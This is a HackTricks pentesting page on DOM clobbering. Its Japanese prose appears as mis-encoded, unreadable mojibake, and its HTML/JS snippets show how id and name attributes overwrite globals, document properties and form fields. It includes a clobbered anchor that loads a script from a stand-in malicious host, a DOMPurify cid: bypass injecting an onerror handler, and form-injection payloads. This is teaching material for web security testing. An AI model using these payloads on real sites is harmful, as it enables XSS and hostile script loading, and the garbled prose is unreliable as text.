# Dom Clobbering

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ**HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[NFTs](https://opensea.io/collection/the-peass-family)ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„
* [**å…¬å¼PEASSï¼†HackTricks swag**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€**[**hacktricksãƒªãƒã‚¸ãƒˆãƒª**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloudãƒªãƒã‚¸ãƒˆãƒª**](https://github.com/carlospolop/hacktricks-cloud) **ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

## **Basics**

**HTMLã‚¿ã‚°å†…ã§ã€å±æ€§`id`ã¨`name`ã‚’ä½¿ç”¨ã—ã¦JSã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆå†…ã§** **ã‚°ãƒ­ãƒ¼ãƒãƒ«å¤‰æ•°ã‚’ç”Ÿæˆã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚**
```html
<form id=x></form>
<script> console.log(typeof document.x) //[object HTMLFormElement] </script>
```
**å”¯ä¸€**ã®ç‰¹å®šã®è¦ç´ ãŒã‚°ãƒ­ãƒ¼ãƒãƒ«ã‚’ä¸Šæ›¸ãã™ã‚‹ãŸã‚ã«**nameå±æ€§**ã‚’ä½¿ç”¨ã§ãã¾ã™ã€‚ãã‚Œã‚‰ã¯ã€`embed`ã€`form`ã€`iframe`ã€`image`ã€`img`ã€ãŠã‚ˆã³`object`ã§ã™ã€‚

èˆˆå‘³æ·±ã„ã“ã¨ã«ã€**formè¦ç´ **ã‚’ä½¿ç”¨ã—ã¦å¤‰æ•°ã‚’**ä¸Šæ›¸ã**ã™ã‚‹ã¨ã€è¦ç´ è‡ªä½“ã®**`toString`**å€¤ãŒå–å¾—ã•ã‚Œã¾ã™ï¼š`[object HTMLFormElement]`ãŒã€**anchor**ã‚’ä½¿ç”¨ã™ã‚‹ã¨**`toString`**ã¯anchorã®**`href`**ã«ãªã‚Šã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€**`a`**ã‚¿ã‚°ã‚’ä½¿ç”¨ã—ã¦ä¸Šæ›¸ãã™ã‚‹ã¨ã€ãã‚ŒãŒ**æ–‡å­—åˆ—ã¨ã—ã¦æ‰±ã‚ã‚Œã‚‹ã¨ãã«** **å€¤**ã‚’**åˆ¶å¾¡**ã§ãã¾ã™ï¼š
```html
<a href="controlled string" id=x></a>
<script>
console.log(x);//controlled string
</script>
```
### é…åˆ—ã¨å±æ€§

é…åˆ—ã‚„ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®å±æ€§ã‚’**clobber**ã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ã€‚
```html
<a id=x>
<a id=x name=y href=controlled>
<script>
console.log(x[1])//controlled
console.log(x.y)//controlled
</script>
```
**3ç•ªç›®ã®å±æ€§**ï¼ˆä¾‹ï¼šx.y.zï¼‰ã‚’clobberã™ã‚‹ã«ã¯ã€**`form`**ã‚’ä½¿ç”¨ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼š
```html
<form id=x name=y><input id=z value=controlled></form>
<form id=x></form>
<script>
alert(x.y.z.value)//controlled
</script>
```
å±æ€§ã‚’ã•ã‚‰ã«ä¸Šæ›¸ãã™ã‚‹ã“ã¨ã¯**ã‚ˆã‚Šè¤‡é›‘ã§ã™ãŒã€ä¾ç„¶ã¨ã—ã¦å¯èƒ½**ã§ã™ã€‚iframesã‚’ä½¿ç”¨ã—ã¾ã™ï¼š
```html
<iframe name=x srcdoc="<a id=y href=controlled></a>"></iframe>
<style>@import 'https://google.com';</style>
<script>alert(x.y)//controlled</script>
```
{% hint style="warning" %}
ã‚¹ã‚¿ã‚¤ãƒ«ã‚¿ã‚°ã¯ã€**iframeãŒãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã•ã‚Œã‚‹ååˆ†ãªæ™‚é–“ã‚’ä¸ãˆã‚‹ãŸã‚ã«ä½¿ç”¨**ã•ã‚Œã¾ã™ã€‚ã“ã‚ŒãŒãªã„ã¨ã€**æœªå®šç¾©**ã®ã‚¢ãƒ©ãƒ¼ãƒˆãŒè¡¨ç¤ºã•ã‚Œã¾ã™ã€‚
{% endhint %}

ã‚ˆã‚Šæ·±ã„å±æ€§ã‚’ä¸Šæ›¸ãã™ã‚‹ã«ã¯ã€æ¬¡ã®ã‚ˆã†ã«**HTMLã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ã‚’ä½¿ç”¨ã—ãŸiframe**ã‚’ä½¿ç”¨ã§ãã¾ã™ï¼š
```html
<iframe name=a srcdoc="<iframe srcdoc='<iframe name=c srcdoc=<a/id=d&amp;amp;#x20;name=e&amp;amp;#x20;href=\controlled&amp;amp;gt;<a&amp;amp;#x20;id=d&amp;amp;gt; name=d>' name=b>"></iframe>
<style>@import 'https://google.com';</style>
<script>
alert(a.b.c.d.e)//controlled
</script>
```
### **ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã®ãƒã‚¤ãƒ‘ã‚¹**

ã‚‚ã—ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ãŒ`document.getElementByID('x').attributes`ã®ã‚ˆã†ãªæ–¹æ³•ã§ãƒãƒ¼ãƒ‰ã®**ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£**ã‚’**ãƒ«ãƒ¼ãƒ—**ã—ã¦ã„ã‚‹å ´åˆã€å±æ€§**`.attributes`**ã‚’**clobber**ã—ã¦ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã‚’**ç ´å£Š**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ä»–ã®DOMãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã€ä¾‹ãˆã°**`tagName`**ã€**`nodeName`**ã€**`parentNode`**ãªã©ã‚‚**clobberable**ã§ã™ã€‚
```html
<form id=x></form>
<form id=y>
<input name=nodeName>
</form>
<script>
console.log(document.getElementById('x').nodeName)//FORM
console.log(document.getElementById('y').nodeName)//[object HTMLInputElement]
</script>
```
## **`window.someObject`ã®ã‚¯ãƒ­ãƒ™ãƒªãƒ³ã‚°**

JavaScriptã§ã¯ã€æ¬¡ã®ã‚ˆã†ãªã‚³ãƒ¼ãƒ‰ãŒä¸€èˆ¬çš„ã§ã™ï¼š
```javascript
var someObject = window.someObject || {};
```
HTMLã®æ“ä½œã‚’é€šã˜ã¦ã€`someObject`ã‚’DOMãƒãƒ¼ãƒ‰ã§ä¸Šæ›¸ãã™ã‚‹ã“ã¨ãŒã§ãã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®è„†å¼±æ€§ã‚’å¼•ãèµ·ã“ã™å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ä¾‹ãˆã°ã€`someObject`ã‚’æ‚ªæ„ã®ã‚ã‚‹ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’æŒ‡ã™ã‚¢ãƒ³ã‚«ãƒ¼ã‚¨ãƒ¬ãƒ¡ãƒ³ãƒˆã§ç½®ãæ›ãˆã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```html
<a id=someObject href=//malicious-website.com/malicious.js></a>
```
è„†å¼±ãªã‚³ãƒ¼ãƒ‰ã®ä¾‹ï¼š
```html
<script>
window.onload = function(){
let someObject = window.someObject || {};
let script = document.createElement('script');
script.src = someObject.url;
document.body.appendChild(script);
};
</script>
```
ã“ã®æ–¹æ³•ã¯ã€ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚½ãƒ¼ã‚¹ã‚’æ‚ªæ„ã®ã‚ã‚‹ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«æ‚ªç”¨ã—ã¾ã™ã€‚

**ãƒˆãƒªãƒƒã‚¯**: **`DOMPurify`**ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€**`cid:`**ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’ä½¿ç”¨ã§ãã¾ã™ãŒã€ã“ã‚Œã¯**äºŒé‡å¼•ç”¨ç¬¦ã‚’URLã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã—ãªã„**ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€**å®Ÿè¡Œæ™‚ã«ãƒ‡ã‚³ãƒ¼ãƒ‰ã•ã‚Œã‚‹ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã•ã‚ŒãŸäºŒé‡å¼•ç”¨ç¬¦ã‚’æ³¨å…¥**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€**`<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">`**ã®ã‚ˆã†ãªã‚‚ã®ã‚’æ³¨å…¥ã™ã‚‹ã¨ã€HTMLã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã•ã‚ŒãŸ`&quot;`ãŒ**å®Ÿè¡Œæ™‚ã«ãƒ‡ã‚³ãƒ¼ãƒ‰**ã•ã‚Œã€å±æ€§å€¤ã‹ã‚‰**è„±å‡º**ã—ã¦**`onerror`**ã‚¤ãƒ™ãƒ³ãƒˆã‚’**ä½œæˆ**ã—ã¾ã™ã€‚

åˆ¥ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã¨ã—ã¦ã€**`form`**è¦ç´ ã‚’ä½¿ç”¨ã™ã‚‹æ–¹æ³•ãŒã‚ã‚Šã¾ã™ã€‚ç‰¹å®šã®ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚µã‚¤ãƒ‰ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã¯ã€æ–°ã—ãä½œæˆã•ã‚ŒãŸãƒ•ã‚©ãƒ¼ãƒ è¦ç´ ã®å±æ€§ã‚’æ¤œæŸ»ã—ã¦ã‚¯ãƒªãƒ¼ãƒ³ã‚¢ãƒƒãƒ—ã—ã¾ã™ã€‚ãŸã ã—ã€ãƒ•ã‚©ãƒ¼ãƒ å†…ã«`id=attributes`ã‚’æŒã¤`input`ã‚’è¿½åŠ ã™ã‚‹ã“ã¨ã§ã€å®Ÿè³ªçš„ãªå±æ€§ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ããªã„ã‚ˆã†ã«å±æ€§ã‚’ä¸Šæ›¸ãã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã“ã®ã‚¿ã‚¤ãƒ—ã®ã‚¯ãƒ­ãƒãƒªãƒ³ã‚°ã®ä¾‹ã‚’[**ã“ã®CTFè§£èª¬ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™**](iframes-in-xss-and-csp.md#iframes-in-sop-2)ã€‚

## ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ã‚¯ãƒ­ãƒãƒªãƒ³ã‚°

ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®å±æ€§ã‚’ä¸Šæ›¸ãã™ã‚‹ã“ã¨ãŒã§ãã‚‹ã¨ã„ã†ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã«ã‚ˆã‚‹ã¨ã€DOM Clobberingã‚’ä½¿ç”¨ã—ã¦æ¬¡ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ï¼š

> [Document](https://html.spec.whatwg.org/multipage/dom.html#document)ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã¯ã€[åå‰ä»˜ããƒ—ãƒ­ãƒ‘ãƒ†ã‚£](https://webidl.spec.whatwg.org/#dfn-support-named-properties)ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ã¾ã™ã€‚[Document](https://html.spec.whatwg.org/multipage/dom.html#document)ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ã‚µãƒãƒ¼ãƒˆã•ã‚Œã¦ã„ã‚‹ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£åã¯ã€[ã„ã¤ã§ã‚‚](https://webidl.spec.whatwg.org/#dfn-supported-property-names)ã€[è¦ç´ ã«ã‚ˆã£ã¦è²¢çŒ®ã•ã‚ŒãŸè¦ç´ ã«ã‚ˆã‚‹[ãƒ„ãƒªãƒ¼ã‚ªãƒ¼ãƒ€ãƒ¼](https://dom.spec.whatwg.org/#concept-tree-order)ã«å¾“ã„ã€å¾Œã®é‡è¤‡ã‚’ç„¡è¦–ã—ã¦ã€[id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute)å±æ€§ã®å€¤ãŒ[name](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute)å±æ€§ã®å€¤ã‚ˆã‚Šã‚‚å‰ã«æ¥ã‚‹å ´åˆã€æ¬¡ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ï¼š
>
> \- [å…¬é–‹](https://html.spec.whatwg.org/multipage/dom.html#exposed)ã•ã‚ŒãŸ[name](https://html.spec.whatwg.org/multipage/dom.html#exposed)å±æ€§ã‚’æŒã¡ã€[ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆãƒ„ãƒªãƒ¼](https://dom.spec.whatwg.org/#in-a-document-tree)å†…ã«ã‚ã‚‹ã€ç©ºã§ãªã„[name](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute)å±æ€§ã‚’æŒã¤[embed](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-embed-element)ã€[form](https://html.spec.whatwg.org/multipage/forms.html#the-form-element)ã€[iframe](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element)ã€[img](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element)ã€ãŠã‚ˆã³[å…¬é–‹](https://html.spec.whatwg.org/multipage/dom.html#exposed)ã•ã‚ŒãŸ[object](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element)è¦ç´ ã®[name](https://html.spec.whatwg.org/multipage/dom.html#exposed)å±æ€§ã®å€¤;\
> \
> \- [å…¬é–‹](https://html.spec.whatwg.org/multipage/dom.html#exposed)ã•ã‚ŒãŸ[id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute)å±æ€§ã‚’æŒã¡ã€[ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆãƒ„ãƒªãƒ¼](https://dom.spec.whatwg.org/#in-a-document-tree)å†…ã«ã‚ã‚‹ã€ç©ºã§ãªã„[id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute)å±æ€§ã‚’æŒã¤[object](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element)è¦ç´ ã®[id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute)å±æ€§ã®å€¤;\
> \
> \- [å…¬é–‹](https://html.spec.whatwg.org/multipage/dom.html#exposed)ã•ã‚ŒãŸ[id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute)å±æ€§ã¨ç©ºã§ãªã„[name](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute)å±æ€§ã‚’æŒã¡ã€[ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆãƒ„ãƒªãƒ¼](https://dom.spec.whatwg.org/#in-a-document-tree)å†…ã«ã‚ã‚‹ã€ç©ºã§ãªã„[id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute)å±æ€§ã¨ç©ºã§ãªã„[name](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute)å±æ€§ã‚’æŒã¤[img](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element)è¦ç´ ã®[id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute)å±æ€§ã®å€¤ã€‚

ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€**`document.cookie`ã€`document.body`ã€`document.children`**ãªã©ã®ä¸€èˆ¬çš„ã«ä½¿ç”¨ã•ã‚Œã‚‹**å€¤ã‚’ä¸Šæ›¸ã**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã¾ãŸã€Documentã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹å†…ã®`document.querySelector`ãªã©ã®ãƒ¡ã‚½ãƒƒãƒ‰ã‚‚ä¸Šæ›¸ãã§ãã¾ã™ã€‚
```javascript
document.write("<img name=cookie />")

document.cookie
<img name="cookie">

typeof(document.cookie)
'object'

//Something more sanitize friendly than a img tag
document.write("<form name=cookie><input id=toString></form>")

document.cookie
HTMLCollection(2)Â [img, form, cookie: img]

typeof(document.cookie)
'object
```
## è¦ç´ ã‚’ä¸Šæ›¸ãã—ãŸå¾Œã«æ›¸ãè¾¼ã‚€

**`document.getElementById()`** ãŠã‚ˆã³ **`document.querySelector()`** ã¸ã®å‘¼ã³å‡ºã—çµæœã¯ã€åŒä¸€ã®idå±æ€§ã‚’æŒã¤ `<html>` ã¾ãŸã¯ `<body>` ã‚¿ã‚°ã‚’æŒ¿å…¥ã™ã‚‹ã“ã¨ã§å¤‰æ›´ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ä»¥ä¸‹ã«ãã®æ–¹æ³•ã‚’ç¤ºã—ã¾ã™ï¼š
```html
<div style="display:none" id="cdnDomain" class="x">test</div>
<p>
<html id="cdnDomain" class="x">clobbered</html>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
alert(document.querySelector('.x').innerText); // Clobbered
</script>
```
ã•ã‚‰ã«ã€ã“ã‚Œã‚‰ã®æŒ¿å…¥ã•ã‚ŒãŸHTML/bodyã‚¿ã‚°ã‚’éè¡¨ç¤ºã«ã™ã‚‹ãŸã‚ã«ã‚¹ã‚¿ã‚¤ãƒ«ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã€`innerText`å†…ã®ä»–ã®ãƒ†ã‚­ã‚¹ãƒˆã‹ã‚‰ã®å¹²æ¸‰ã‚’é˜²ãã€æ”»æ’ƒã®åŠ¹æœã‚’é«˜ã‚ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```html
<div style="display:none" id="cdnDomain">test</div>
<p>existing text</p>
<html id="cdnDomain">clobbered</html>
<style>
p{display:none;}
</style>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
SVGã¸ã®èª¿æŸ»ã‹ã‚‰ã€`<body>` ã‚¿ã‚°ã‚‚åŠ¹æœçš„ã«åˆ©ç”¨ã§ãã‚‹ã“ã¨ãŒæ˜ã‚‰ã‹ã«ãªã‚Šã¾ã—ãŸ:
```html
<div style="display:none" id="cdnDomain">example.com</div>
<svg><body id="cdnDomain">clobbered</body></svg>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
ä»¥ä¸‹ã¯ã€Chromeã‚„Firefoxãªã©ã®ãƒ–ãƒ©ã‚¦ã‚¶ã§SVGå†…ã§HTMLã‚¿ã‚°ã‚’æ©Ÿèƒ½ã•ã›ã‚‹ãŸã‚ã«ã¯ã€`<foreignobject>`ã‚¿ã‚°ãŒå¿…è¦ã§ã™ï¼š
```html
<div style="display:none" id="cdnDomain">example.com</div>
<svg>
<foreignobject>
<html id="cdnDomain">clobbered</html>
</foreignobject>
</svg>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
## ãƒ•ã‚©ãƒ¼ãƒ ã®ã‚¯ãƒ­ãƒãƒªãƒ³ã‚°

ã„ãã¤ã‹ã®ã‚¿ã‚°å†…ã§`form`å±æ€§ã‚’æŒ‡å®šã™ã‚‹ã“ã¨ã§ã€ãƒ•ã‚©ãƒ¼ãƒ å†…ã«æ–°ã—ã„ã‚¨ãƒ³ãƒˆãƒªã‚’è¿½åŠ ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚ã“ã‚Œã‚’ä½¿ç”¨ã—ã¦ã€ãƒ•ã‚©ãƒ¼ãƒ å†…ã«æ–°ã—ã„å€¤ã‚’è¿½åŠ ã—ãŸã‚Šã€æ–°ã—ã„ãƒœã‚¿ãƒ³ã‚’è¿½åŠ ã—ã¦ãã‚Œã‚’é€ä¿¡ã™ã‚‹ã“ã¨ã•ãˆã§ãã¾ã™ï¼ˆã‚¯ãƒªãƒƒã‚¯ã‚¸ãƒ£ãƒƒã‚­ãƒ³ã‚°ã¾ãŸã¯`.click()` JSã‚³ãƒ¼ãƒ‰ã‚’æ‚ªç”¨ï¼‰ã€‚
```html
<!--Add a new attribute and a new button to send-->
<textarea form=id-other-form name=info>
";alert(1);//
</textarea>
<button form=id-other-form type="submit" formaction="/edit" formmethod="post">
Click to send!
</button>
```
{% endcode %}

* ã‚ˆã‚Šå¤šãã®ãƒ•ã‚©ãƒ¼ãƒ å±æ€§ã«ã¤ã„ã¦ã¯ã€[**ã“ã¡ã‚‰ã‚’ãƒã‚§ãƒƒã‚¯**](https://www.w3schools.com/tags/tag\_button.asp)**ã€‚**

## å‚è€ƒæ–‡çŒ®

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)
* [https://portswigger.net/web-security/dom-based/dom-clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)
* Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker.

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ã”è¦§ãã ã•ã„
* [**å…¬å¼PEASSï¼†HackTricksã‚¹ã‚¦ã‚§ã‚°**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†
* **ğŸ’¬** [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«å‚åŠ ã™ã‚‹ã‹ã€[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€** [**hacktricksãƒªãƒã‚¸ãƒˆãƒª**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloudãƒªãƒã‚¸ãƒˆãƒª**](https://github.com/carlospolop/hacktricks-cloud) **ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
